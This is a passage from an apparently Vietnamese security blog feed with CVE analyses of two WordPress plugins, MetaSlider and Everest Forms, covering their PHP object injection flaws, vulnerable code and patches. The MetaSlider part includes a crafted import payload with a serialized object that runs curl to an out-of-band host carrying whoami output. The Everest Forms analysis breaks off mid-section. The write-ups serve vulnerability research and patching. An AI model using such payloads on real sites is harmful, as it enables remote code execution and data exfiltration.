{&#xA;      &amp;#34;metaslider_slideshow_theme&amp;#34;: &amp;#34;a:6:{s:6:\&amp;#34;folder\&amp;#34;;s:12:\&amp;#34;default-base\&amp;#34;;s:5:\&amp;#34;title\&amp;#34;;s:4:\&amp;#34;Base\&amp;#34;;s:4:\&amp;#34;type\&amp;#34;;s:4:\&amp;#34;free\&amp;#34;;s:8:\&amp;#34;supports\&amp;#34;;a:1:{i:0;s:4:\&amp;#34;flex\&amp;#34;;}s:4:\&amp;#34;tags\&amp;#34;;a:0:{}s:11:\&amp;#34;description\&amp;#34;;s:37:\&amp;#34;This is the default MetaSlider theme.\&amp;#34;;}&amp;#34;,&#xA;      &amp;#34;ml-slider_settings&amp;#34;: &amp;#34;...&amp;#34;&#xA;    },&#xA;    &amp;#34;slides&amp;#34;: [&#xA;      {&#xA;        &amp;#34;original_id&amp;#34;: 265,&#xA;        &amp;#34;order&amp;#34;: 0,&#xA;        &amp;#34;post_excerpt&amp;#34;: &amp;#34;&amp;#34;,&#xA;        &amp;#34;image&amp;#34;: &amp;#34;erol-ahmed-305920-unsplash-1&amp;#34;,&#xA;        &amp;#34;image_alt&amp;#34;: &amp;#34;erol-ahmed-305920-unsplash-1&amp;#34;,&#xA;        &amp;#34;meta&amp;#34;: {&#xA;          &amp;#34;ml-slider_type&amp;#34;: &amp;#34;O:4:\&amp;#34;Evil\&amp;#34;:1:{s:7:\&amp;#34;command\&amp;#34;;s:74:\&amp;#34;curl http:\/\/9blonkz57zyrp69hwuz5tw0uoluci26r.oastify.com?leadked=$(whoami)\&amp;#34;;}&amp;#34;,&#xA;          &amp;#34;ml-slider_inherit_image_title&amp;#34;: &amp;#34;1&amp;#34;,&#xA;          &amp;#34;ml-slider_inherit_image_alt&amp;#34;: &amp;#34;1&amp;#34;,&#xA;          &amp;#34;ml-slider_crop_position&amp;#34;: &amp;#34;center-center&amp;#34;,&#xA;          &amp;#34;ml-slider_caption_source&amp;#34;: &amp;#34;image-caption&amp;#34;,&#xA;          &amp;#34;_wp_attachment_image_alt&amp;#34;: &amp;#34;&amp;#34;&#xA;        }&#xA;      }&#xA;    ]&#xA;  },&#xA;  &amp;#34;metadata&amp;#34;: {&#xA;    &amp;#34;version&amp;#34;: &amp;#34;3.94.0&amp;#34;,&#xA;    &amp;#34;date&amp;#34;: &amp;#34;2025/11/26&amp;#34;&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Import lại file JSON được sửa.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-26-cve-2025-26763/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-26-cve-2025-26763/result.png&#39; alt=&#34;Result&#34; height=&#34;575&#34; width=&#34;1042&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗi phát sinh do plugin gọi &lt;code&gt;maybe_unserialize()&lt;/code&gt; trực tiếp trên dữ liệu import mà không kiểm tra, cho phép chèn chuỗi serialized độc hại dẫn đến PHP Object Injection. Bản vá 3.95.0 đã khắc phục bằng cách chặn serialized object và dùng hàm unserialize an toàn hơn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không được unserialize dữ liệu người dùng khi chưa kiểm tra.&lt;/li&gt;&#xA;&lt;li&gt;Chức năng import/export luôn là bề mặt tấn công nhạy cảm.&lt;/li&gt;&#xA;&lt;li&gt;Kiểm soát serialized data (đặc biệt là chuỗi bắt đầu bằng &lt;code&gt;O:&lt;/code&gt;) là bắt buộc.&lt;/li&gt;&#xA;&lt;li&gt;Dùng &lt;code&gt;allowed_classes =&amp;gt; false&lt;/code&gt; để ngăn tạo object khi unserialize.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ml-slider/vulnerability/wordpress-slider-gallery-and-carousel-by-metaslider-image-slider-video-slider-plugin-3-94-0-php-object-injection-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Responsive Slider by MetaSlider Plugin &amp;lt;= 3.94.0 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-3439 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-25-cve-2025-3439/</link>
      <pubDate>Tue, 25 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-25-cve-2025-3439/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Plugin Everest Forms – Contact Form, Quiz, Survey, Newsletter &amp;amp; Payment Form Builder for WordPress&lt;/strong&gt; trên WordPress tồn tại lỗ hổng &lt;strong&gt;PHP Object Injection&lt;/strong&gt; trong tất cả các phiên bản cho đến, và bao gồm, &lt;strong&gt;3.1.1&lt;/strong&gt; thông qua việc giải tuần tự dữ liệu không tin cậy từ tham số &lt;code&gt;field_value&lt;/code&gt;.&#xA;Điều này cho phép kẻ tấn công &lt;strong&gt;chưa xác thực&lt;/strong&gt; chèn một PHP Object. Phần mềm dễ bị tấn công này &lt;strong&gt;không có chuỗi POP&lt;/strong&gt; nào được biết đến, nghĩa là lỗ hổng này sẽ không gây ảnh hưởng trừ khi có plugin hoặc theme khác chứa chuỗi POP được cài đặt trên trang web.&#xA;Nếu chuỗi POP tồn tại thông qua plugin hoặc theme bổ sung được cài đặt trên hệ thống mục tiêu, nó có thể cho phép kẻ tấn công thực hiện các hành động như &lt;strong&gt;xóa tệp tùy ý&lt;/strong&gt;, &lt;strong&gt;lấy dữ liệu nhạy cảm&lt;/strong&gt;, hoặc &lt;strong&gt;thực thi mã&lt;/strong&gt; tùy thuộc vào chuỗi POP hiện diện.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-3439&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-3439&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.1.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/everest-forms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Everest Forms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Everest Forms&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v3.1.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $field_value ) || is_numeric( $field_value ) ) {&#xA;    if ( is_serialized( $field_value ) ) {&#xA;        $field_value = maybe_unserialize( $field_value );&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đoạn mã này, hàm &lt;strong&gt;&lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/strong&gt; được gọi trực tiếp trên dữ liệu người dùng (&lt;code&gt;$field_value&lt;/code&gt;). Điều này tạo ra lỗ hổng nghiêm trọng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguy cơ Object Injection&lt;/strong&gt;: Nếu attacker chèn payload PHP object vào dữ liệu base64, quá trình decode và unserialize sẽ khởi tạo object độc hại, dẫn đến &lt;strong&gt;Object Injection&lt;/strong&gt; và có khả năng tiến tới &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thiếu kiểm tra an toàn&lt;/strong&gt;: Không có bước xác thực dữ liệu trước khi thực hiện unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không có cơ chế fallback&lt;/strong&gt;: Nếu dữ liệu không hợp lệ hoặc bị lỗi, hệ thống không có phương án xử lý thay thế, khiến ứng dụng dễ bị khai thác.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v3.1.2):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/diff.png&#39; alt=&#34;Diff&#34; height=&#34;243&#34; width=&#34;1831&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã sử dụng &lt;code&gt;evf_maybe_unserialize()&lt;/code&gt; thay cho &lt;code&gt;maybe_unserialize()&lt;/code&gt; của WordPress:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function evf_maybe_unserialize( $data, $options = array() ) {&#xA;    if ( is_serialized( $data ) ) {&#xA;        if ( version_compare( PHP_VERSION, &amp;#39;7.1.0&amp;#39;, &amp;#39;&amp;gt;=&amp;#39; ) ) {&#xA;            $options = wp_parse_args( $options, array( &amp;#39;allowed_classes&amp;#39; =&amp;gt; false ) );&#xA;            return @unserialize( trim( $data ), $options ); //phpcs:ignore.&#xA;        }&#xA;        return @unserialize( trim( $data ) ); //phpcs:ignore.&#xA;    }&#xA;&#xA;    return $data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;unserialize()&lt;/code&gt; được sử dụng với option &lt;code&gt;&#39;allowed_classes&#39; =&amp;gt; false&lt;/code&gt; đã loại bỏ hoàn toàn khả năng tạo object, từ đó xử lý triệt để lỗ hổng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một submenu &lt;code&gt;Entries&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_submenu_page( &amp;#39;everest-forms&amp;#39;, esc_html__( &amp;#39;Everest Forms Entries&amp;#39;, &amp;#39;everest-forms&amp;#39; ), esc_html__( &amp;#39;Entries&amp;#39;, &amp;#39;everest-forms&amp;#39; ), current_user_can( &amp;#39;everest_forms_view_entries&amp;#39; ) ? &amp;#39;everest_forms_view_entries&amp;#39; : &amp;#39;everest_forms_view_others_entries&amp;#39;, &amp;#39;evf-entries&amp;#39;, array( $this, &amp;#39;entries_page&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Callback &lt;code&gt;entries_page&lt;/code&gt; được gọi khi truy cập vào submenu này:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function entries_page() {&#xA;    EVF_Admin_Entries::page_output();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm gọi đến &lt;code&gt;page_output()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function page_output() {&#xA;    if ( apply_filters( &amp;#39;everest_forms_entries_list_actions&amp;#39;, false ) ) {&#xA;        do_action( &amp;#39;everest_forms_entries_list_actions_execute&amp;#39; );&#xA;    } elseif ( isset( $_GET[&amp;#39;view-entry&amp;#39;] ) ) { // phpcs:ignore WordPress.Security.NonceVerification&#xA;        include &amp;#39;views/html-admin-page-entries-view.php&amp;#39;;&#xA;    } else {&#xA;        self::table_list_output();&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi &lt;code&gt;$_GET[&#39;view-entry&#39;]&lt;/code&gt; tồn tại thì view &lt;code&gt;html-admin-page-entries-view.php&lt;/code&gt; sẽ được include.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-25-cve-2025-3439/entries.png&#34; title=&#34;Entries Page&#34; data-thumbnail=&#34;/posts/2025-11-25-cve-2025-3439/entries.png&#34; data-sub-html=&#34;&lt;h2&gt;Entries&lt;/h2&gt;&lt;p&gt;Entries Page&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-25-cve-2025-3439/entries.png&#39; alt=&#34;Entries&#34; height=&#34;998&#34; width=&#34;1231&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Entries Page&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trang này sẽ hiển thị tất cả nội dung form được submit từ người dùng.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$entry_meta = apply_filters( &amp;#39;everest_forms_entry_single_data&amp;#39;, $entry-&amp;gt;meta, $entry, $form_data );&#xA;...&#xA;foreach ( $entry_meta as $meta_key =&amp;gt; $meta_value ) {&#xA;    $meta_value = is_serialized( $meta_value ) ? $meta_value : wp_strip_all_tags( $meta_value );&#xA;    if ( evf_is_json( $meta_value ) ) {&#xA;        $meta_value = json_decode( $meta_value, true );&#xA;        $meta_value = $meta_value[&amp;#39;value&amp;#39;];&#xA;    }&#xA;    ...&#xA;    $field_value     = apply_filters( &amp;#39;everest_forms_html_field_value&amp;#39;, $meta_value, $entry_meta[ $meta_key ], $entry_meta, &amp;#39;entry-single&amp;#39; );&#xA;    ...&#xA;    if ( ! empty( $field_value ) || is_numeric( $field_value ) ) {&#xA;        if ( is_serialized( $field_value ) ) {&#xA;            $field_value = maybe_unserialize( $field_value );&#xA;        }&#xA;        ...&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$entry_meta&lt;/code&gt; là tập dữ liệu mà người dùng đã submit từ form hiện tại. Mỗi phần tử trong mảng này bao gồm một cặp &lt;code&gt;meta_key&lt;/code&gt; và &lt;code&gt;meta_value&lt;/code&gt;, và hệ thống sẽ duyệt qua từng phần tử để xử lý.&lt;/p&gt;&#xA;&lt;p&gt;Trong vòng lặp, giá trị &lt;code&gt;$meta_value&lt;/code&gt; được kiểm tra:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Nếu giá trị là JSON&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Hàm &lt;code&gt;evf_is_json()&lt;/code&gt; xác định xem chuỗi có phải JSON hợp lệ hay không.&lt;/li&gt;&#xA;&lt;li&gt;Nếu đúng, dữ liệu được giải mã bằng &lt;code&gt;json_decode()&lt;/code&gt; và lấy giá trị tại &lt;code&gt;$meta_value[&#39;value&#39;]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Sau đó &lt;code&gt;$field_value&lt;/code&gt; được tạo ra&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Giá trị này được tạo từ &lt;code&gt;$meta_value[&#39;value&#39;]&lt;/code&gt; thông qua bộ lọc &lt;code&gt;everest_forms_html_field_value&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Xử lý dữ liệu serialize&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nếu &lt;code&gt;$field_value&lt;/code&gt; có định dạng serialize, hàm &lt;code&gt;maybe_unserialize()&lt;/code&gt; sẽ được gọi để giải mã dữ liệu về dạng bình thường.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 